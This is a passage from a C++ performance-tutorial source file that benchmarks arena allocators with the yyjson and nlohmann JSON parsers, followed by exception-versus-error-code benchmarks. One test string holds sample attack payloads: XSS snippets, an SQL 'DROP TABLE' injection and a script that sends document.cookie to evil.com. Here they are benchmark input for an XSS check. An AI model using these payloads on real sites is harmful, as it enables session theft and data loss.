 *  will never exceed the MTU size itself, which are well known for common protocols:
 *
 *  - Link Layer:
 *      - Ethernet: @b 1500 bytes, or 9000 bytes with Jumbo Frames
 *      - 802.11 Wi-Fi: 2304 bytes excluding headers, often reduced to 1500 bytes
 *        for compatibility with Ethernet
 *      - InfiniBand: configurable between 256, 512, 1024, 2048, and @b 4096 bytes
 *  - Network Layer:
 *      - IPv4: 576 to 1500 bytes with Path MTU Discovery
 *      - IPv6: 1280 to 1500 bytes with Path MTU Discovery
 *  - Transport Layer:
 *      - TCP: normally up to 1460 bytes of payload, subtracting 20 bytes for the
 *        IP header and 20 bytes for the TCP header from the most common 1500 bytes
 *        of Ethernet MTU
 *      - RDMA: normally 4096, when operating over InfiniBand
 *
 *  So, in theory we could benefit greatly from keeping a tiny local arena
 *  for parsing and introspecting network traffic. Let's try and do this with the
 *  C and C++ libraries, enumerating all of the JSON sub-objects in a single packet,
 *  and checking for malicious scripts, like a Cross-Site Scripting (XSS) attack:
 *
 *      { "comment": "<script>alert('XSS')</script>" }
 */
#include <cstring> // `std::memset`, `std::memmove`

static constexpr std::string_view valid_json = R"({
    "meta": { "id": 42, "valid": true, "coordinates": [ 0.0, 0.0 ], "nesting": [ [ [ null ] ] ] },
    "greetings": [
        { "language": "English", "text": "Hello there! How are you doing on this sunny day?" },
        { "language": "日本語", "text": "こんにちは！今日は晴れていますが、お元気ですか？" },
        { "language": "Español", "text": "Hola a todos, ¿cómo estáis hoy tan soleado?" }
    ]
})";

static constexpr std::string_view invalid_json = R"({
    "meta": { "id": 42, "valid": true, "coordinates": [ 1.234, 5.678 ], "nesting": [ [ [ null ] ] ] },
    "greetings": [
        { "language": "English", "text": "Hello there! How are you doing on this sunny day?" },
        { "language": "日本語", "text": "こんにちは！今日は晴れていますが、お元気ですか？" },
        { "language": "Español", "text": "Hola a todos, ¿cómo estáis hoy tan soleado?" }
    ],
    "source": "127.0.0.1, // no inline comments in vanilla JSON!
})"; // Missing closing quote, inline comment, and trailing comma - pick your poison 😁

static constexpr std::string_view malicious_json = R"({
    "meta": { "id": "<script>alert(document.cookie)</script>", "valid": true, "nesting": [ [ [ null ] ] ] },
    "greetings": [
        { "language": "English", "text": "Hello there! <img src=x onerror='alert(1)'>" },
        { "language": "HTML", "text": "<iframe src='javascript:alert(`XSS`)'></iframe>" },
        { "language": "SQL", "text": "'; DROP TABLE users; --" }
    ],
    "comment": "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://evil.com/steal?cookie=' + document.cookie);</script>"
})"; // SQL injection, XSS, and a cookie-stealing script while we're at it 😁

static constexpr std::string_view packets_json[3] = {valid_json, invalid_json, malicious_json};

struct fixed_buffer_arena_t {
    static constexpr std::size_t capacity = 4096;
    alignas(64) std::byte buffer[capacity];

    /// The offset (in bytes) of the next free location
    std::size_t total_allocated = 0;
    /// The total bytes "freed" so far
    std::size_t total_reclaimed = 0;
};

/**
 *  @brief  Allocates a new chunk of `size` bytes from the arena.
 *  @return The new pointer or `nullptr` if OOM.
 */
inline std::byte *allocate_from_arena(fixed_buffer_arena_t &arena, std::size_t size) noexcept {
    if (arena.total_allocated + size > fixed_buffer_arena_t::capacity) return nullptr; // Not enough space
    std::byte *ptr = arena.buffer + arena.total_allocated;
    arena.total_allocated += size;
    return ptr;
}

/**
 *  @brief  Deallocates a chunk of memory previously allocated from the arena.
 *          This implementation does not "reuse" partial free space unless everything is freed.
 */
inline void deallocate_from_arena(fixed_buffer_arena_t &arena, std::byte *ptr, std::size_t size) noexcept {
    // Check if ptr is within the arena
    std::byte *start = arena.buffer;
    std::byte *end = arena.buffer + fixed_buffer_arena_t::capacity;
    if (ptr < start || ptr >= end) return; // Invalid pointer => no-op
    arena.total_reclaimed += size;
    // Reset completely if fully reclaimed
    if (arena.total_allocated == arena.total_reclaimed) arena.total_allocated = 0, arena.total_reclaimed = 0;
}

/**
 *  @brief  Reallocates `ptr` to have `new_size` bytes. The old size was `old_size`.
 *          If `ptr` is the last chunk allocated, and there's room to grow in place, just expands.
 *          Otherwise, do allocates, copies, and frees.
 *  @return The new pointer or `nullptr` if OOM.
 */
inline std::byte *reallocate_from_arena( //
    fixed_buffer_arena_t &arena, std::byte *ptr, std::size_t old_size, std::size_t new_size) noexcept {
    if (!ptr) return allocate_from_arena(arena, new_size); //  A fresh allocation

    // This is effectively a `free` operation
    if (new_size == 0) {
        deallocate_from_arena(arena, ptr, old_size);
        return nullptr;
    }

    std::byte *end_of_this_chunk = ptr + old_size;
    std::byte *arena_end = arena.buffer + arena.total_allocated;
    bool is_last_chunk = end_of_this_chunk == arena_end;

    if (is_last_chunk) {
        // Expand in-place if there's enough room
        std::size_t offset = static_cast<std::size_t>(ptr - arena.buffer);
        std::size_t required_space = offset + new_size;
        if (required_space <= fixed_buffer_arena_t::capacity) {
            // We can grow (or shrink) in place
            arena.total_allocated = required_space;
            return ptr;
        }
    }

    // If we can’t grow in place, do: allocate new + copy + free old
    std::byte *new_ptr = allocate_from_arena(arena, new_size);
    if (!new_ptr) return nullptr; // Out of memory

    // Copy the old data
    std::memmove(new_ptr, ptr, std::min(old_size, new_size));
    deallocate_from_arena(arena, ptr, old_size);
    return new_ptr;
}

#define YYJSON_DISABLE_WRITER 1          // Faster compilation & smaller binary
#define YYJSON_DISABLE_UTILS 1           // Faster compilation & smaller binary
#define YYJSON_DISABLE_UTF8_VALIDATION 1 // Faster runtime, but may not be fair
#include <yyjson.h>                      // `yyjson` library

bool contains_xss_in_yyjson(yyjson_val *node) noexcept {
    if (!node) return false;

    // Handle dictionary-like objects
    if (yyjson_is_obj(node)) {
        size_t idx, max;
        yyjson_val *key, *val;
        yyjson_obj_foreach(node, idx, max, key, val) {
            if (contains_xss_in_yyjson(val)) return true;
        }
        return false;
    }
    // Handle array
    else if (yyjson_is_arr(node)) {
        yyjson_val *val;
        yyjson_arr_iter iter = yyjson_arr_iter_with(node);
        while ((val = yyjson_arr_iter_next(&iter)))
            if (contains_xss_in_yyjson(val)) return true;
        return false;
    }
    // Handle string values
    else if (yyjson_is_str(node)) {
        std::string_view value(yyjson_get_str(node), yyjson_get_len(node));
        return value.find("<script>alert('XSS')</script>") != std::string_view::npos;
    }
    else { return false; }
}

/**
 *  `yyjson` does not only allows to override the allocator, but also passes a context object down:
 *
 *      void *(* malloc)(void *ctx, size_t size)
 *      void *(* realloc)(void *ctx, void *ptr, size_t old_size, size_t size)
 *      void (* free)(void *ctx, void *ptr)
 *
 *  It's @b almost perfect, except for one thing: the `free` doesn't receive the size of the block,
 *  so you must do bookkeeping yourself!
 *
 *  @see YYJSON allocators: https://ibireme.github.io/yyjson/doc/doxygen/html/structyyjson__alc.html
 */
template <bool use_arena>
static void json_yyjson(bm::State &state) {

    // Wrap our custom arena into a `yyjson_alc` structure, alternatively we could use:
    //
    //    char yyjson_buffer[4096];
    //    yyjson_alc_pool_init(&alc, yyjson_buffer, sizeof(yyjson_buffer));
    //
    using arena_t = fixed_buffer_arena_t;
    arena_t arena;
    yyjson_alc alc;
    alc.ctx = &arena;

    //? There is a neat trick that allows us to use a lambda as a
    //? C-style function pointer by using the unary `+` operator.
    //? Assuming our buffer is only 4 KB, a 16-bit unsigned integer is enough...
    using alc_size_t = std::uint16_t;
    alc.malloc = +[](void *ctx, size_t size_native) noexcept -> void * {
        alc_size_t size = static_cast<alc_size_t>(size_native);
        std::byte *result = allocate_from_arena(*static_cast<fixed_buffer_arena_t *>(ctx), size + sizeof(alc_size_t));
        if (!result) return nullptr;
        std::memcpy(result, &size, sizeof(alc_size_t));
        return (void *)(result + sizeof(alc_size_t));
    };
    alc.realloc = +[](void *ctx, void *ptr, size_t old_size_native, size_t size_native) noexcept -> void * {
        alc_size_t old_size = static_cast<alc_size_t>(old_size_native);
        alc_size_t size = static_cast<alc_size_t>(size_native);
        std::byte *start = static_cast<std::byte *>(ptr) - sizeof(alc_size_t);
        std::byte *new_start = reallocate_from_arena( //
            *static_cast<arena_t *>(ctx), start,      //
            old_size + sizeof(alc_size_t), size + sizeof(alc_size_t));
        if (!new_start) return nullptr;
        // Don't forget to increment the size if the pointer was reallocated
        std::memcpy(new_start, &size, sizeof(alc_size_t));
        return (void *)(new_start + sizeof(alc_size_t));
    };
    alc.free = +[](void *ctx, void *ptr) noexcept -> void {
        std::byte *start = static_cast<std::byte *>(ptr) - sizeof(alc_size_t);
        alc_size_t size;
        std::memcpy(&size, start, sizeof(alc_size_t));
        deallocate_from_arena(*static_cast<arena_t *>(ctx), start, size + sizeof(alc_size_t));
    };

    // Repeat the checks many times
    std::size_t bytes_processed = 0;
    std::size_t peak_memory_usage = 0;
    std::size_t iteration = 0;
    for (auto _ : state) {

        std::string_view packet_json = packets_json[iteration++ % 3];
        bytes_processed += packet_json.size();

        yyjson_read_err error;
        std::memset(&error, 0, sizeof(error));

        yyjson_doc *doc = yyjson_read_opts(                 //
            (char *)packet_json.data(), packet_json.size(), //
            YYJSON_READ_NOFLAG, use_arena ? &alc : NULL, &error);
        if (!error.code) bm::DoNotOptimize(contains_xss_in_yyjson(yyjson_doc_get_root(doc)));
        peak_memory_usage = std::max(peak_memory_usage, arena.total_allocated);
        yyjson_doc_free(doc);
    }
    state.SetBytesProcessed(bytes_processed);
    state.counters["peak_memory_usage"] = bm::Counter(peak_memory_usage, bm::Counter::kAvgThreads);
}

BENCHMARK(json_yyjson<false>)->MinTime(10)->Name("json_yyjson<malloc>");
BENCHMARK(json_yyjson<true>)->MinTime(10)->Name("json_yyjson<fixed_buffer>");
BENCHMARK(json_yyjson<false>)->MinTime(10)->Name("json_yyjson<malloc>")->Threads(physical_cores());
BENCHMARK(json_yyjson<true>)->MinTime(10)->Name("json_yyjson<fixed_buffer>")->Threads(physical_cores());

/**
 *  The `nlohmann::json` library is designed to be simple and easy to use, but it's
 *  not the most efficient or flexible. This should be clear even from the interface
 *  level. Let's design a small `std::allocator` alternative, similar to STL's
 *  polymorphic allocator, but with a fixed buffer arena and avoiding all of the
 *  `virtual` nonsense :)
 */
#include <nlohmann/json.hpp>
template <template <typename> typename allocator_>

struct json_containers_for_alloc {
    // Must allow `map<Key, Value, typename... Args>`, replaces `std::map`
    template <typename key_type_, typename value_type_, typename...>
    using object = std::map<key_type_, value_type_, std::less<>, allocator_<std::pair<const key_type_, value_type_>>>;

    // Must allow `vector<Value, typename... Args>`, replaces `std::vector`
    template <typename value_type_, typename...>
    using array = std::vector<value_type_, allocator_<value_type_>>;

    using string = std::basic_string<char, std::char_traits<char>, allocator_<char>>;
};

template <template <typename> typename allocator_>
using json_with_alloc = nlohmann::basic_json<               //
    json_containers_for_alloc<allocator_>::template object, // JSON object
    json_containers_for_alloc<allocator_>::template array,  // JSON array
    typename json_containers_for_alloc<allocator_>::string, // string type
    bool,                                                   // boolean type
    std::int64_t,                                           // integer type
    std::uint64_t,                                          // unsigned type
    double,                                                 // float type
    allocator_,                                             // must allow `allocator<Value>`, replaces `std::allocator`
    nlohmann::adl_serializer,                               // must allow `serializer<Value>`
    std::vector<std::uint8_t, allocator_<std::uint8_t>>,    // binary type
    void                                                    // custom base class
    >;

/**
 *  The `allocate_from_arena` and `deallocate_from_arena` are fairly elegant and simple.
 *  But we have no way of supplying our `fixed_buffer_arena_t` instance to the `nlohmann::json`
 *  library and it has no mechanism internally to propagate the allocator state to the nested
 *  containers:
 *
 *      switch (t) {
 *          case value_t::object: {
 *              AllocatorType<object_t> alloc;
 *              std::allocator_traits<decltype(alloc)>::destroy(alloc, object);
 *              std::allocator_traits<decltype(alloc)>::deallocate(alloc, object, 1);
 *              break;
 *          }
 *          case value_t::array: {
 *              ...
 *
 *  So with `nlohmann::json` we are forced to use some singleton @b `thread_local` state,
 *  which is an immediate @b code-smell, while with `yyjson` we can pass a context object down!
 */

thread_local fixed_buffer_arena_t local_arena;

template <typename value_type_>
struct fixed_buffer_allocator {
    using value_type = value_type_;

    fixed_buffer_allocator() noexcept = default;

    template <typename other_type_>
    fixed_buffer_allocator(fixed_buffer_allocator<other_type_> const &) noexcept {}

    value_type *allocate(std::size_t n) noexcept(false) {
        if (auto ptr = allocate_from_arena(local_arena, n * sizeof(value_type)); ptr)
            return reinterpret_cast<value_type *>(ptr);
        else
            throw std::bad_alloc();
    }

    void deallocate(value_type *ptr, std::size_t n) noexcept {
        deallocate_from_arena(local_arena, reinterpret_cast<std::byte *>(ptr), n * sizeof(value_type));
    }

    // Rebind mechanism and comparators are for compatibility with STL containers
    template <typename other_type_>
    struct rebind {
        using other = fixed_buffer_allocator<other_type_>;
    };
    bool operator==(fixed_buffer_allocator const &) const noexcept { return true; }
    bool operator!=(fixed_buffer_allocator const &) const noexcept { return false; }
};

template <typename json_type_>
bool contains_xss_nlohmann(json_type_ const &j) noexcept {
    if (j.is_object()) {
        for (auto const &it : j.items())
            if (contains_xss_nlohmann(it.value())) return true;
        return false;
    }
    else if (j.is_array()) {
        for (auto const &elem : j)
            if (contains_xss_nlohmann(elem)) return true;
        return false;
    }
    else if (j.is_string()) {
        using string_t = typename json_type_::string_t;
        auto const &s = j.template get_ref<string_t const &>();
        return s.find("<script>alert('XSS')</script>") != string_t::npos;
    }
    else { return false; }
}

using default_json = json_with_alloc<std::allocator>;
using fixed_buffer_json = json_with_alloc<fixed_buffer_allocator>;

template <typename json_type_, bool use_exceptions>
static void json_nlohmann(bm::State &state) {
    std::size_t bytes_processed = 0;
    std::size_t peak_memory_usage = 0;
    std::size_t iteration = 0;
    for (auto _ : state) {

        std::string_view packet_json = packets_json[iteration++ % 3];
        bytes_processed += packet_json.size();

        json_type_ json;
        // The vanilla default (recommended) behavior is to throw exceptions on parsing errors.
        // As we know from the error handling benchmarks, exceptions can be extremely slow,
        // if they are thrown frequently.
        if constexpr (use_exceptions) {
            try {
                json = json_type_::parse(packet_json);
                bm::DoNotOptimize(contains_xss_nlohmann(json));
            }
            catch (typename json_type_::exception const &e) {
                continue;
            }
        }
        // There is, however, a much nicer way to do it avoiding exceptions.
        // https://json.nlohmann.me/features/parsing/parse_exceptions/#switch-off-exceptions
        //
        else {
            json = json_type_::parse(packet_json, nullptr, false);
            if (!json.is_discarded()) bm::DoNotOptimize(contains_xss_nlohmann(json));
        }
        if constexpr (!std::is_same_v<json_type_, default_json>)
            peak_memory_usage = std::max(peak_memory_usage, local_arena.total_allocated);
    }
    state.SetBytesProcessed(bytes_processed);
    state.counters["peak_memory_usage"] = bm::Counter(peak_memory_usage, bm::Counter::kAvgThreads);
}

BENCHMARK(json_nlohmann<default_json, true>)->MinTime(10)->Name("json_nlohmann<std::allocator, throw>");
BENCHMARK(json_nlohmann<fixed_buffer_json, true>)->MinTime(10)->Name("json_nlohmann<fixed_buffer, throw>");
BENCHMARK(json_nlohmann<default_json, false>)->MinTime(10)->Name("json_nlohmann<std::allocator, noexcept>");
BENCHMARK(json_nlohmann<fixed_buffer_json, false>)->MinTime(10)->Name("json_nlohmann<fixed_buffer, noexcept>");
BENCHMARK(json_nlohmann<default_json, true>)
    ->MinTime(10)
    ->Name("json_nlohmann<std::allocator, throw>")
    ->Threads(physical_cores());
BENCHMARK(json_nlohmann<fixed_buffer_json, true>)
    ->MinTime(10)
    ->Name("json_nlohmann<fixed_buffer, throw>")
    ->Threads(physical_cores());
BENCHMARK(json_nlohmann<default_json, false>)
    ->MinTime(10)
    ->Name("json_nlohmann<std::allocator, noexcept>")
    ->Threads(physical_cores());
BENCHMARK(json_nlohmann<fixed_buffer_json, false>)
    ->MinTime(10)
    ->Name("json_nlohmann<fixed_buffer, noexcept>")
    ->Threads(physical_cores());

/**
 *  The results for the single-threaded case and the multi-threaded case are:
 *
 *  - `json_yyjson<malloc>`:                       @b 291 ns       @b 554 ns
 *  - `json_yyjson<fixed_buffer>`:                 @b 263 ns       @b 468 ns
 *  - `json_nlohmann<std::allocator, throw>`:      @b 6'330 ns     @b 9'370 ns
 *  - `json_nlohmann<fixed_buffer, throw>`:        @b 4'915 ns     @b 8'130 ns
 *  - `json_nlohmann<std::allocator, noexcept>`:   @b 4'108 ns     @b 6'963 ns
 *  - `json_nlohmann<fixed_buffer, noexcept>`:     @b 4'075 ns     @b 6'194 ns
 *
 *  Some of Unum's libraries, like `usearch` can take multiple allocators for
 *  different parts of a complex hybrid data-structure with clearly divisible
 *  memory management patterns. A.k.a. part of the structure is append-only,
 *  and another part is frequently modified, but only in fixed-size blocks,
 *  perfect for an "arena" allocator.
 *
 *  If you are ambitious enough to build advanced memory allocators, check
 *  out the implementation of `jemalloc`, `mimalloc`, `tcmalloc`, and `hoard`.
 *
 *  @see Heap Layers project by Emery Berger: https://github.com/emeryberger/Heap-Layers
 */

#pragma endregion // JSON, Allocators, and Designing Complex Containers

#pragma region Trees, Graphs, and Data Layouts
/**
 *  We already understand the cost of accessing non-contiguous memory, cache misses,
 *  pointer chasing, split loads, data locality, and even parallelism, and asynchrony,
 *  but it's not the same as concurrency and concurrent data-structures.
 *
 *  Let's imagine a somewhat realistic app, that will be analyzing some sparse graph
 *  data-structure.
 *
 *  1. Typical weighted directed graph structure, built on nested @b `std::unordered_map`s.
 *  2. More memory-friendly 2-level @b `absl::flat_hash_map` using Google's Abseil library.
 *  3. Cleaner, single-level @b `std::map` with transparent comparison function.
 *  4. Flat design on top of a @b `absl::flat_hash_set` of tuples, taking the best of 2 and 3.
 *
 *  In code, the raw structure may look like:
 *
 *  1. `std::unordered_map<std::uint16_t, std::unordered_map<std::uint16_t, float>>`
 *  2. `absl::flat_hash_map<std::uint16_t, absl::flat_hash_map<std::uint16_t, float>>`
 *  3. `std::map<std::pair<std::uint16_t, std::uint16_t>, float, ...>`
 *  4. `std::flat_hash_set<std::tuple<std::uint16_t, std::uint16_t, float>, ...>`
 *
 *  ... but we may want to use more expressive type aliases.
 *
 *  @see "Designing a Fast, Efficient, Cache-friendly Hash Table, Step by Step"
 *       by Matt Kulukundis at CppCon 2017: https://youtu.be/ncHmEUmJZf4
 */

#pragma endregion // Trees, Graphs, and Data Layouts

#pragma region Concurrent Data Structures

/**
 *  @see "C++ atomics, from basic to advanced. What do they really do?"
 *       by Fedor Pikus at CppCon 2017: https://youtu.be/ZQFzMfHIxng
 */

#include <atomic>       // `std::atomic`
#include <mutex>        // `std::mutex`
#include <shared_mutex> // `std::shared_mutex`

#pragma endregion // Concurrent Data Structures

#pragma endregion // - Structures, Tuples, ADTs, AOS, SOA

#pragma region - Exceptions, Backups, Logging

#pragma region Errors

/**
 *  In the real world, control-flow gets messy, as different methods will
 *  break in different places. Let's imagine a system, that:
 *
 *  - Reads an integer from a text file.
 *  - Increments it.
 *  - Saves it back to the text file.
 *
 *  As soon as we start dealing with "external devices", as opposed to the CPU itself,
 *  failures become regular. The file may not exist, the integer may not be a number,
 *  the file may be read-only, the disk may be full, the file may be locked, etc.
 */
#include <charconv>  // `std::from_chars`, `std::to_chars`
#include <stdexcept> // `std::runtime_error`, `std::out_of_range`

constexpr std::size_t fail_period_read_integer = 6;
constexpr std::size_t fail_period_convert_to_integer = 11;
constexpr std::size_t fail_period_next_string = 17;
constexpr std::size_t fail_period_write_back = 23;

double get_max_value(std::vector<double> const &v) noexcept { return *(std::max_element(std::begin(v), std::end(v))); }

static std::string read_integer_from_file_or_throw( //
    [[maybe_unused]] std::string const &filename, std::size_t iteration_index) noexcept(false) {
    if (iteration_index % fail_period_read_integer == 0) throw std::runtime_error("File read failed");
    if (iteration_index % fail_period_convert_to_integer == 0) return "abc";
    // Technically, the constructor may throw `std::bad_alloc` if the allocation fails,
    // but given the Small String Optimization, it shouldn't happen in practice.
    return "1";
}

static std::size_t string_to_integer_or_throw( //
    std::string const &value, [[maybe_unused]] std::size_t iteration_index) noexcept(false) {
    // The `std::stoull` function may throw:
    // - `std::invalid_argument` if no conversion could be performed.
    // - `std::out_of_range` if the converted value would fall out of the range of the
    //   result type or if the underlying function sets `errno` to `ERANGE`.
    // The cleaner modern way to implement this is using `std::from_chars` in C++17.
    std::size_t integral_value = 0;
    std::from_chars_result result = std::from_chars(value.data(), value.data() + value.size(), integral_value);
    if (result.ec != std::errc()) throw std::out_of_range("Conversion failed");
    return integral_value;
}

static std::string integer_to_next_string_or_throw(std::size_t value, std::size_t iteration_index) noexcept(false) {
    if (iteration_index % fail_period_next_string == 0) throw std::runtime_error("Increment failed");
    value++;
    constexpr std::size_t buffer_size = 10;
    char buffer[buffer_size] {};
    std::to_chars_result result = std::to_chars(buffer, buffer + buffer_size, value);
    if (result.ec != std::errc()) throw std::out_of_range("Conversion failed");
    return std::string(buffer, result.ptr - buffer);
}

static void write_to_file_or_throw( //
    [[maybe_unused]] std::string const &filename, [[maybe_unused]] std::string const &value,
    std::size_t iteration_index) noexcept(false) {
    if (iteration_index % fail_period_write_back == 0) throw std::runtime_error("File write failed");
}

static void errors_throw(bm::State &state) {
    std::string const filename = "test.txt";
    std::size_t iteration_index = 0;
    for (auto _ : state) {
        iteration_index++;
        try {
            std::string read_value = read_integer_from_file_or_throw(filename, iteration_index);
            std::size_t integer_value = string_to_integer_or_throw(read_value, iteration_index);
            std::string next_value = integer_to_next_string_or_throw(integer_value, iteration_index);
            write_to_file_or_throw(filename, next_value, iteration_index);
        }
        catch (std::exception const &) {
        }
    }
}

BENCHMARK(errors_throw)->ComputeStatistics("max", get_max_value)->MinTime(2);
BENCHMARK(errors_throw)->ComputeStatistics("max", get_max_value)->MinTime(2)->Threads(physical_cores());

/**
 *  Until C++23, we don't have a `std::expected` implementation,
 *  but it's easy to design one using `std::variant` and `std::error_code`.
 */
#include <system_error> // `std::error_code`
#include <variant>      // `std::variant`

using std::operator""s;

template <typename value_type_>
class expected {
    std::variant<value_type_, std::error_code> value_;

  public:
    expected(value_type_ const &value) noexcept : value_(value) {}
    expected(std::error_code const &error) noexcept : value_(error) {}

    explicit operator bool() const noexcept { return std::holds_alternative<value_type_>(value_); }
    value_type_ const &value() const noexcept { return std::get<value_type_>(value_); }
    std::error_code const &error() const noexcept { return std::get<std::error_code>(value_); }
    template <typename function_type_>
    auto and_then(function_type_ &&f) const noexcept {
        if (std::holds_alternative<value_type_>(value_)) return f(std::get<value_type_>(value_));
        return *this;
    }
};

static expected<std::string> read_integer_from_file_or_variants( //
    [[maybe_unused]] std::string const &filename, std::size_t iteration_index) noexcept {
    if (iteration_index % fail_period_read_integer == 0) return std::error_code {EIO, std::generic_category()};
    if (iteration_index % fail_period_convert_to_integer == 0) return "abc"s;
    // Technically, the constructor may throw `std::bad_alloc` if the allocation fails,
    // but given the Small String Optimization, it shouldn't happen in practice.
    return "1"s;
}

static expected<std::size_t> string_to_integer_or_variants( //
    std::string const &value, [[maybe_unused]] std::size_t iteration_index) noexcept {
    std::size_t integral_value = 0;
    std::from_chars_result result = std::from_chars(value.data(), value.data() + value.size(), integral_value);
    if (result.ec != std::errc()) return std::make_error_code(result.ec);
    return integral_value;
}

static expected<std::string> integer_to_next_string_or_variants(std::size_t value,
                                                                std::size_t iteration_index) noexcept {
    if (iteration_index % fail_period_next_string == 0) return std::error_code {EIO, std::generic_category()};
    value++;
    constexpr std::size_t buffer_size = 10;
    char buffer[buffer_size] {};
    std::to_chars_result result = std::to_chars(buffer, buffer + buffer_size, value);
    if (result.ec != std::errc()) return std::make_error_code(result.ec);
    return std::string(buffer, result.ptr - buffer);
}

static std::error_code write_to_file_or_variants( //
    [[maybe_unused]] std::string const &filename, [[maybe_unused]] std::string const &value,
    std::size_t iteration_index) noexcept {
    if (iteration_index % fail_period_write_back == 0) return std::error_code {EIO, std::generic_category()};
    return std::error_code {};
}

static void errors_variants(bm::State &state) {
    std::string const filename = "test.txt";
    std::size_t iteration_index = 0;
    for (auto _ : state) {
        iteration_index++;
        auto read_result = read_integer_from_file_or_variants(filename, iteration_index);
        if (!read_result) continue;
        auto integer_result = string_to_integer_or_variants(read_result.value(), iteration_index);
        if (!integer_result) continue;
        auto next_result = integer_to_next_string_or_variants(integer_result.value(), iteration_index);
        if (!next_result) continue;
        auto write_error = write_to_file_or_variants(filename, next_result.value(), iteration_index);
        bm::DoNotOptimize(write_error);
    }
}

BENCHMARK(errors_variants)->ComputeStatistics("max", get_max_value)->MinTime(2);
BENCHMARK(errors_variants)->ComputeStatistics("max", get_max_value)->MinTime(2)->Threads(physical_cores());

/**
 *  As practice shows, STL is almost never the performance-oriented choice!
 *  It's often good enough to get started, but every major player reimplements
 *  STL-like primitives for its own needs. In some cases, no primitives are
 *  needed at all, as the language itself provides the necessary tools.
 *
 *  Instead of using the heavy `std::variant`, that will contain an integer
 *  to distinguish between the value and the error, plus the heavy error object
 *  itself, we can use a simple `struct` with a status code.
 */
enum class status : unsigned int {
    success,
    read_failed,
    convert_failed,
    increment_failed,
    write_failed,
};

template <typename value_type_>
struct result {
    value_type_ value;
    status status_code;
};

static result<std::string> read_integer_from_file_with_status( //
    [[maybe_unused]] std::string const &filename, std::size_t iteration_index) noexcept {
    if (iteration_index % fail_period_read_integer == 0) return {{}, status::read_failed};
    if (iteration_index % fail_period_convert_to_integer == 0) return {"abc"s, status::success};
    // Technically, the constructor may throw `std::bad_alloc` if the allocation fails,
    // but given the Small String Optimization, it shouldn't happen in practice.
    return {"1"s, status::success};
}

static result<std::size_t> string_to_integer_with_status( //
    std::string const &value, [[maybe_unused]] std::size_t iteration_index) noexcept {
    std::size_t integral_value = 0;
    std::from_chars_result result = std::from_chars(value.data(), value.data() + value.size(), integral_value);
    if (result.ec != std::errc()) return {0, status::convert_failed};
    return {integral_value, status::success};
}

static result<std::string> integer_to_next_string_with_status(std::size_t value, std::size_t iteration_index) noexcept {
    if (iteration_index % fail_period_next_string == 0) return {{}, status::increment_failed};
    value++;
    constexpr std::size_t buffer_size = 10;
    char buffer[buffer_size] {};
    std::to_chars_result result = std::to_chars(buffer, buffer + buffer_size, value);
    if (result.ec != std::errc()) return {{}, status::increment_failed};
    return {std::string(buffer, result.ptr - buffer), status::success};
}

static status write_to_file_with_status( //
    [[maybe_unused]] std::string const &filename, [[maybe_unused]] std::string const &value,
    std::size_t iteration_index) noexcept {
    if (iteration_index % fail_period_write_back == 0) return status::write_failed;
    return status::success;
}

static void errors_with_status(bm::State &state) {
    std::string const filename = "test.txt";
    std::size_t iteration_index = 0;
    for (auto _ : state) {
        iteration_index++;
        auto [read_result, read_status] = read_integer_from_file_with_status(filename, iteration_index);
        if (read_status != status::success) continue; // In large programs, consider adding `[[unlikely]]`
        auto [integer_result, integer_status] = string_to_integer_with_status(read_result, iteration_index);
        if (integer_status != status::success) continue; // In large programs, consider adding `[[unlikely]]`
        auto [next_result, next_status] = integer_to_next_string_with_status(integer_result, iteration_index);
        if (next_status != status::success) continue; // In large programs, consider adding `[[unlikely]]`
        auto write_status = write_to_file_with_status(filename, next_result, iteration_index);
        bm::DoNotOptimize(write_status);
    }
}

BENCHMARK(errors_with_status)->ComputeStatistics("max", get_max_value)->MinTime(2);
BENCHMARK(errors_with_status)->ComputeStatistics("max", get_max_value)->MinTime(2)->Threads(physical_cores());

/**
 *  On Intel Sapphire Rapids:
 *  - Throwing an STL exception: @b 268ns single-threaded, @b 815ns multi-threaded.
 *  - Returning an STL error code: @b 7ns single-threaded, @b 24ns multi-threaded.
 *  - Returning a custom status code: @b 4ns single-threaded, @b 15ns multi-threaded.
 *
 *  On Apple M2 Pro:
 *  - Throwing an STL exception: @b 728ns single-threaded, @b 837ns multi-threaded.
 *  - Returning an STL error code: @b 12ns single-threaded, @b 13ns multi-threaded.
 *  - Returning a custom status code: @b 7ns single-threaded, @b 7ns multi-threaded.
 *
 *  Those numbers explain, why over 20% of the industry members explicitly ban exceptions
 *  in their codebases, according to the 2020 Developer Ecosystem Survey by JetBrains.
 *
 *  @see "De-fragmenting C++: Making Exceptions and RTTI More Affordable and Usable"
 *       by Herb Sutter at CppCon 2019: https://youtu.be/ARYP83yNAWk
 *  @see "The State of Developer Ecosystem 2020" from JetBrains:
 *       https://www.jetbrains.com/lp/devecosystem-2020/cpp/
 *  @see "Better 'Goodput' Performance through C++ Exception Handling" from ScyllaDB:
 *       https://www.scylladb.com/2024/05/14/better-goodput-performance-through-c-exception-handling/
 */

#pragma endregion // Errors

#pragma region Logs
#if defined(__cpp_lib_source_location)

/**
 *  Similar to error handling, logging can be done in different ways.
 *  Nice logs may look like this:
 *
 *      [time] | [filename]:[source-line] <[code]> "[message]"
 *
 *  The time should be in a ISO 8601 format, and a line for `EPERM` may look like this:
 *
 *      YYYY-MM-DDTHH:MM:SS.mmm | less_slow.cpp:2053 <1> "Operation not permitted"
 *
 *  C++ has one of the best standard libraries for time - `std::chrono`, and one of
 *  the most powerful formatting libraries - `std::format`, derived from `fmt::`.
 *  Both are more capable than most users realize!
 */
#include <chrono>          // `std::chrono`
#include <source_location> // `std::source_location`
#include <string_view>     // `std::string_view`

using std::string_view_literals::operator""sv;

struct log_printf_t {
    std::size_t operator()(                    //
        char *buffer, std::size_t buffer_size, //
        std::source_location const &location, int code, std::string_view message) const noexcept {

        auto now = std::chrono::high_resolution_clock::now();
        auto time_since_epoch = now.time_since_epoch();

        // Extract seconds and milliseconds
        auto seconds = std::chrono::duration_cast<std::chrono::seconds>(time_since_epoch);
        auto milliseconds = std::chrono::duration_cast<std::chrono::milliseconds>(time_since_epoch) - seconds;

        // Format as ISO 8601: YYYY-MM-DDTHH:MM:SS.mmm
        auto time_t_now = std::chrono::system_clock::to_time_t(now);
        auto tm = std::gmtime(&time_t_now); // UTC only, no local timezone dependency

        int count_bytes = std::snprintf( //
            buffer, buffer_size,
            "%04d-%02d-%02dT%02d:%02d:%02d.%03dZ | "                                     // time format
            "%s:%d <%03d> "                                                              // location and code format
            "\"%.*s\"\n",                                                                // message format
            tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,                             // date
